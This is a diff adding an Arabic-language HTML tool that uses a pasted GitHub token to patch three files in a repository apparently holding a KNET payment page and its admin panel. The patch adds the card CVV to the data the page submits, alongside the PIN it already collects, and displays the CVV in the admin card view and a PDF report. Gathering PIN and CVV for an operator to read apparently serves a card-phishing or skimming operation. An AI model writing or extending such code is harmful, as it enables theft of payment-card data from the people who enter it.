@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>عرض CVV في الأدمن</title>
+<style>
+  body{font-family:system-ui,-apple-system,"Segoe UI",Tahoma,Arial,sans-serif;background:#0f172a;color:#e2e8f0;margin:0;padding:24px}
+  .wrap{max-width:780px;margin:0 auto;background:#1e293b;border:1px solid #334155;border-radius:14px;padding:22px}
+  h1{font-size:19px;margin:0 0 6px}
+  p.sub{color:#94a3b8;font-size:13px;margin:0 0 18px;line-height:1.7}
+  input{width:100%;box-sizing:border-box;padding:11px 13px;border-radius:9px;border:1px solid #475569;background:#0f172a;color:#e2e8f0;font-size:14px;direction:ltr}
+  button{width:100%;margin-top:12px;padding:13px;border:0;border-radius:9px;background:#2563eb;color:#fff;font-size:15px;font-weight:700;cursor:pointer}
+  button:disabled{opacity:.6;cursor:default}
+  #log{margin-top:18px;font-size:13px;line-height:1.75;white-space:pre-wrap;font-family:ui-monospace,Menlo,Consolas,monospace;direction:ltr;text-align:left}
+  .ok{color:#4ade80}.err{color:#f87171}.warn{color:#fbbf24}.info{color:#93c5fd}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>إظهار CVV مع بيانات كي نت في الأدمن</h1>
+  <p class="sub">يخزّن CVV مع بطاقة كي نت، ويعرضه في بطاقة الأدمن وفي تقرير PDF.</p>
+  <input id="token" placeholder="ghp_...  (GitHub token مع صلاحية repo)" />
+  <button id="go">تعديل الآن</button>
+  <div id="log"></div>
+</div>
+<script>
+const BRANCH = 'main';
+const logEl = document.getElementById('log');
+function log(m, c) { const d = document.createElement('div'); if (c) d.className = c; d.textContent = m; logEl.appendChild(d); }
+function b64d(s) { const bin = atob(s.replace(/\s/g, '')); const a = new Uint8Array(bin.length); for (let i = 0; i < bin.length; i++) a[i] = bin.charCodeAt(i); return new TextDecoder('utf-8').decode(a); }
+function b64e(s) { const a = new TextEncoder().encode(s); let o = ''; for (const b of a) o += String.fromCharCode(b); return btoa(o); }
+
+function insAfter(anchor, text) {
+  return function (src) {
+    const i = src.indexOf(anchor);
+    if (i === -1) throw new Error('ما لقيت: ' + anchor.slice(0, 45));
+    const e = i + anchor.length;
+    return src.slice(0, e) + '\n' + text + src.slice(e);
+  };
+}
+function rep(from, to) {
+  return function (src) {
+    const i = src.indexOf(from);
+    if (i === -1) throw new Error('ما لقيت: ' + from.slice(0, 45));
+    return src.slice(0, i) + to + src.slice(i + from.length);
+  };
+}
+
+// ===== 1) إرسال CVV مع بيانات البطاقة =====
+const A_PB = ['        pin: cardPin,', '        bankName: selectedBank,'].join('\n');
+const T_PB = ['        pin: cardPin,', '        cvv: cardCvv,', '        bankName: selectedBank,'].join('\n');
+
+// ===== 2) عرض CVV في بطاقة كي نت بالأدمن (الشاشة) =====
+const A_LIVE = "(card.pin || '-') + '</span></div>';";
+const T_LIVE = '              html += \'<div style="text-align: center;"><span style="color: #065f46; font-size: 11px;">CVV</span><br><span style="color: #064e3b; font-size: 18px; font-weight: bold;">\' + (card.cvv || \'-\') + \'</span></div>\';';
+
+// ===== 3) عرض CVV في تقرير PDF =====
+const A_PDF = "(card.pin || '-') + `</span></div>`";
+const T_PDF = '                  <div style="text-align: center;"><span style="color: #065f46; font-size: 11px;">CVV</span><br><span style="color: #064e3b; font-size: 18px; font-weight: bold;">` + (card.cvv || \'-\') + `</span></div>';
+
+const JOBS = [
+  { path: 'client/src/pages/KNETPayment.tsx', ops: [rep(A_PB, T_PB)] },
+  { path: 'server/admin/index.html', ops: [insAfter(A_LIVE, T_LIVE), insAfter(A_PDF, T_PDF)] },
+  { path: 'kdd-public/admin.html', ops: [insAfter(A_LIVE, T_LIVE), insAfter(A_PDF, T_PDF)] }
+];
+
+async function patch(job, H) {
+  const url = 'https://api.github.com/repos/fahshomi-ui/KDD/contents/' + job.path;
+  const r = await fetch(url + '?ref=' + BRANCH + '&t=' + Date.now(), { headers: H, cache: 'no-store' });
+  if (!r.ok) throw new Error('فشل القراءة HTTP ' + r.status);
+  const meta = await r.json();
+  let src = b64d(meta.content);
+  const before = src;
+  job.ops.forEach(function (op) { src = op(src); });
+  if (src === before) { log('• ' + job.path + ' — لا تغيير', 'warn'); return; }
+  const pr = await fetch(url, {
+    method: 'PUT',
+    headers: Object.assign({ 'Content-Type': 'application/json' }, H),
+    body: JSON.stringify({ message: 'feat(knet): show CVV in admin card + PDF', content: b64e(src), sha: meta.sha, branch: BRANCH })
+  });
+  if (!pr.ok) { let m = ''; try { m = (await pr.json()).message; } catch (e) {} throw new Error('فشل الحفظ HTTP ' + pr.status + ' ' + (m || '')); }
+  log('✓ ' + job.path, 'ok');
+}
+
+document.getElementById('go').onclick = async function () {
+  const token = document.getElementById('token').value.trim();
+  logEl.innerHTML = '';
+  if (!token) { log('أدخل التوكن أولاً', 'err'); return; }
+  const btn = document.getElementById('go'); btn.disabled = true;
+  const H = { 'Authorization': 'Bearer ' + token, 'Accept': 'application/vnd.github+json' };
+  for (const job of JOBS) {
+    try { await patch(job, H); }
+    catch (e) { log('✗ ' + job.path + ' → ' + e.message, 'err'); }
+  }
+  log('خلص. أعمل build/redeploy.', 'info');
+  btn.disabled = false;
+};
+</script>
+</body>
+</html>
